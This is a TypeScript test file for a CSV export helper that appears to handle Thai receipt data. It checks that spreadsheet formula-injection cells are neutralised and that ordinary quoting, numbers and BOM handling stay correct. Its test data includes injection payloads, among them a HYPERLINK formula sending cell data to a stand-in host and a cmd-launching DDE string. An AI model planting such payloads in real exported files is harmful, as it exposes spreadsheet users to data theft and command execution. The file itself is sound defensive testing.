import assert from "node:assert/strict";
import { escapeCsvCell, toCsvRow, csvResponse } from "./csv.ts";

let pass = 0;
const check = (name: string, fn: () => void) => {
  fn();
  console.log(`  ok  ${name}`);
  pass++;
};
const checkAsync = async (name: string, fn: () => Promise<void>) => {
  await fn();
  console.log(`  ok  ${name}`);
  pass++;
};

// --- formula injection ----------------------------------------------
for (const [label, payload] of [
  ["equals", "=1+1"],
  ["plus", "+1+1"],
  ["at", "@SUM(A1)"],
  ["tab", "\tcmd"],
  ["carriage return", "\rcmd"],
] as const) {
  check(`neutralizes a cell starting with ${label}`, () => {
    const out = escapeCsvCell(payload);
    // The apostrophe must be the first character of the cell value. Quoted
    // cells carry it just inside the opening quote.
    const inner = out.startsWith('"') ? out.slice(1) : out;
    assert.ok(inner.startsWith("'"), `expected leading quote, got ${out}`);
  });
}

check("neutralizes a real-world hyperlink payload from a store name", () => {
  const out = escapeCsvCell('=HYPERLINK("http://evil.test?d="&A1,"click")');
  assert.ok(out.startsWith(`"'=HYPERLINK`), out);
});

check("neutralizes a payload that only starts like a negative number", () => {
  assert.equal(escapeCsvCell("-2+3+cmd|' /C calc'!A0"), "'-2+3+cmd|' /C calc'!A0");
});

// --- numbers stay numeric -------------------------------------------
check("negative number stays numeric (no apostrophe)", () => {
  assert.equal(escapeCsvCell(-1250.5), "-1250.5");
});
check("negative numeric STRING stays numeric", () => {
  assert.equal(escapeCsvCell("-1250.50"), "-1250.50");
});
check("positive number is untouched", () => {
  assert.equal(escapeCsvCell(4527.2), "4527.2");
});
check("zero is untouched, not blanked", () => {
  assert.equal(escapeCsvCell(0), "0");
});
check("non-finite number becomes empty rather than 'NaN'", () => {
  assert.equal(escapeCsvCell(NaN), "");
  assert.equal(escapeCsvCell(Infinity), "");
});

// --- ordinary CSV behavior preserved --------------------------------
check("null and undefined become empty", () => {
  assert.equal(escapeCsvCell(null), "");
  assert.equal(escapeCsvCell(undefined), "");
});
check("Thai text passes through unquoted", () => {
  assert.equal(escapeCsvCell("แม็คโคร"), "แม็คโคร");
});
check("comma forces quoting", () => {
  assert.equal(escapeCsvCell("ร้าน, สาขา 2"), '"ร้าน, สาขา 2"');
});
check("embedded quotes are doubled", () => {
  assert.equal(escapeCsvCell('ร้าน "ดี"'), '"ร้าน ""ดี"""');
});
check("CRLF is normalized to LF inside a quoted cell", () => {
  assert.equal(escapeCsvCell("บรรทัด1\r\nบรรทัด2"), '"บรรทัด1\nบรรทัด2"');
});
check("row joins cells with commas", () => {
  assert.equal(toCsvRow(["2026-08-01", "แม็คโคร", 107]), "2026-08-01,แม็คโคร,107");
});
check("a dangerous cell inside a row is still neutralized", () => {
  assert.equal(toCsvRow(["2026-08-01", "=cmd", 107]), "2026-08-01,'=cmd,107");
});

// --- response shape --------------------------------------------------
await checkAsync(
  "response carries BOM bytes, CRLF line endings and the filename",
  async () => {
    const res = csvResponse(["a,b", "1,2"], "bill-orc-receipts.csv");
    assert.equal(res.headers.get("Content-Type"), "text/csv; charset=utf-8");
    assert.match(
      res.headers.get("Content-Disposition") ?? "",
      /attachment; filename="bill-orc-receipts\.csv"/
    );
    // Assert on raw bytes: Response.text() strips a leading BOM per spec,
    // so a text-level check would pass even if the BOM were missing.
    const bytes = new Uint8Array(await res.arrayBuffer());
    assert.deepEqual(
      Array.from(bytes.slice(0, 3)),
      [0xef, 0xbb, 0xbf],
      "missing UTF-8 BOM bytes"
    );
    assert.ok(new TextDecoder().decode(bytes).includes("\r\n"), "expected CRLF");
  }
);

console.log(`\n${pass} checks passed`);
